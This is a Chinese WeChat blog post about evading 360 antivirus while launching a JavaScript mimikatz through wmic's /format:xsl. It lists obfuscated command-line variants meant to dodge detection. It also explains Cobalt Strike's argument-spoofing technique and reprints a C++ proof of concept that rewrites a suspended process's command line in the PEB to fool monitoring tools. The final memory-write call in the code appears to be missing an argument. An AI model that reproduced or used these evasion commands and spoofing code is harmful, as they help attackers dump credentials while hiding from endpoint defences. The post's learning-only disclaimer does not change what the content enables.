> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SDLIvAqHi6hLnio95fx73g)

  

点击蓝字关注我哦

前言  

-----

在学习通过 wmic 加载 mimikatz 的时候，发现一个有趣的现象，也发现了一个事实。

通过 wmic 去加载 js 版的 mimikatz 的时候，火绒不候拦截，但是 360 会拦截 wmic 这个行为

  

1. 加载 mimikatz
--------------

命令：

```
wmic os get /format:"111111.xsl"
#这里的xsl是js版的minikatz
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODud9nvtQ9b9S0Xzmx98hlVZOVx20VStI6IsDUPRNAzicqpLiag9U4aCDxjQF7kib4jJA743QbqQS8lUQ/640?wx_fmt=png)

但是从风险的框来看，360 安全卫士并没识别出此 xs1 文件是什么？这很好，尝试着绕过

开始尝试各种命令行混淆：

```
w^m^i^c,;os,;get /format:"111111.xsl"
for /L %i in (start,step,end) do wmic os get /format:"111111.xsl"
cmd /v:on /c "set envar=wmic os get /format:"111111.xsl" && !envar!"
...........
```

但是最大的困难不是这个，是 360 拦着拦着就不拦截了，这是最玄学的，只能关机重启，反复重启！！！！！！！（我猜测是云大脑在某方面做了策略，检测多次拦截一个常规的程序，就会给这个程序一定时间的白名单，因为我反复重启没用，还是不拦）

在测试 N 编之后，发现，360 把所有的白名单程序都加入了自己的规则库了，就算白名单程序执行错误的，也会拦截。

期间也使用了一些常规的白名单程序加载，替换了父子进程链，除却一些不能加参数的白名单程序，好像都会一样的被拦截

2. 学习 CS 中的 argue 命令原理
----------------------

通过询问部门大佬，获悉一种参数混淆的新姿势（对于我来说）

在 Cobalt Strike 3.13 中，引入了 argue，该 argue 命令是作为利用参数欺骗的一种方式引入的

该原理概括来讲，就是在进程启动的时候，使用了一些迷惑的参数比如

wmic aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 什么的

但是一但进程被创建，那么它将被暂停，然后我们通过获取进程块的 PEB 地址（这里主要通过 NtQueryInformationProcess api 来完成），然后利用 PEB 地址通过 ReadProcessMemory api 来获取进程块的内存副本，然后从 RTL_USER_PROCESS_PARAMETERS 结构中找到 CommandLine 字段，替换成正常的命令行参数，比如 os get /format:"111111.xsl", 然后恢复进程继续执行，当我们通过 process Monitor 来查看的时候，会发现创建进程的时候传入的参数是无意义的混淆的参数，但实际上是我们执行的是正常参数，好一点偷梁换柱。

```
#include <iostream>
#include <Windows.h>
#include <winternl.h>
 
typedef NTSTATUS(*NtQueryInformationProcess2)(
    IN HANDLE,
    IN PROCESSINFOCLASS,
    OUT PVOID,
    IN ULONG,
    OUT PULONG
    );
 
void* readProcessMemory(HANDLE process, void *address, DWORD bytes) {
    SIZE_T bytesRead;
    char *alloc;
 
    alloc = (char *)malloc(bytes);
    if (alloc == NULL) {
        return NULL;
    }
 
    if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
        free(alloc);
        return NULL;
    }
 
    return alloc;
}
 
BOOL writeProcessMemory(HANDLE process, void *address, void *data, DWORD bytes) {
    SIZE_T bytesWritten;
 
    if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
        return false;
    }
 
    return true;
}
 
int main(int argc, char **canttrustthis)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT context;
    BOOL success;
    PROCESS_BASIC_INFORMATION pbi;
    DWORD retLen;
    SIZE_T bytesRead;
    PEB pebLocal;
    RTL_USER_PROCESS_PARAMETERS *parameters;
 
    printf("Argument Spoofing Example by @_xpn_\n\n");
 
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
 
    // Start process suspended
    success = CreateProcessA(
        NULL, 
        (LPSTR)"powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL, 
        "C:\\Windows\\System32\\", 
        &si, 
        &pi);
 
    if (success == FALSE) {
        printf("[!] Error: Could not call CreateProcess\n");
        return 1;
    }
 
    // Retrieve information on PEB location in process
    NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
    ntpi(
        pi.hProcess, 
        ProcessBasicInformation, 
        &pbi, 
        sizeof(pbi), 
        &retLen
    );
 
    // Read the PEB from the target process
    success = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
    if (success == FALSE) {
        printf("[!] Error: Could not call ReadProcessMemory to grab PEB\n");
        return 1;
    }
 
    // Grab the ProcessParameters from PEB
    parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
        pi.hProcess, 
        pebLocal.ProcessParameters, 
        sizeof(RTL_USER_PROCESS_PARAMETERS) + 300
    );
 
    // Set the actual arguments we are looking to use
    WCHAR spoofed[] = L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0";
    success = writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer, (void*)spoofed, sizeof(spoofed));
    if (success == FALSE) {
        printf("[!] Error: Could not call WriteProcessMemory to update commandline args\n");
        return 1;
    }
    
    /////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////
 
    // Update the CommandLine length (Remember, UNICODE length here)
    DWORD newUnicodeLen = 28;
    
    success = writeProcessMemory(
        pi.hProcess, 
        (char *)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), 
        (void*)&newUnicodeLen, 
    );
    if (success == FALSE) {
        printf("[!] Error: Could not call WriteProcessMemory to update commandline arg length\n");
        return 1;
    }
 
    // Resume thread execution*/
    ResumeThread(pi.hThread);
}
```

c++ 参考代码

3. 实际使用效果
---------

执行效果：

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODud9nvtQ9b9S0Xzmx98hlVZqwcDBGl85Z2gnkfGQTvnic6gEdASaLnxiakAo6aaaZCE2GMw8MEHP2hA/640?wx_fmt=png)

 可以看到这里展示的使我们混淆的参数。

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODud9nvtQ9b9S0Xzmx98hlVZ4CbWtlvaawUFv7wHianpqxN2BnGA0VKbrRJhFzYwvvtNEslxwq8DjJw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

END

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtIZ5VYusLbEoY8iaTjibTWg6AKjAQiahf2fctN4PSdYm2O1Hibr56ia39iaJcxBoe04t4nlYyOmRvCr56Q/640?wx_fmt=gif)

**看完记得点赞，关注哟，爱您！**

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

关注此公众号，回复 "Gamma" 关键字免费领取一套网络安全视频以及相关书籍，公众号内还有收集的常用工具！

  

**在看你就赞赞我！**

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbThXaInFkmyjOOcBoNCXGun5icNbT4mjCjcREA3nMN7G8icS0IKM3ebuLA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTkwLkofibxKKjhEu7Rx8u1P8sibicPkzKmkjjvddDg8vDYxLibe143CwHAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODuKK75wg0AnoibFiaUSRyYlmhIZ0mrzg9WCcWOtyblENWAOdHxx9BWjlJclPlVRxA1gHkkxRpyK2cpg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码关注我们

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码领 hacker 资料，常用工具，以及各种福利

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTnHS31hY5p9FJS6gMfNZcSH2TibPUmiam6ajGW3l43pb0ySLc1FibHmicibw/640?wx_fmt=gif)

转载是一种动力 分享是一种美德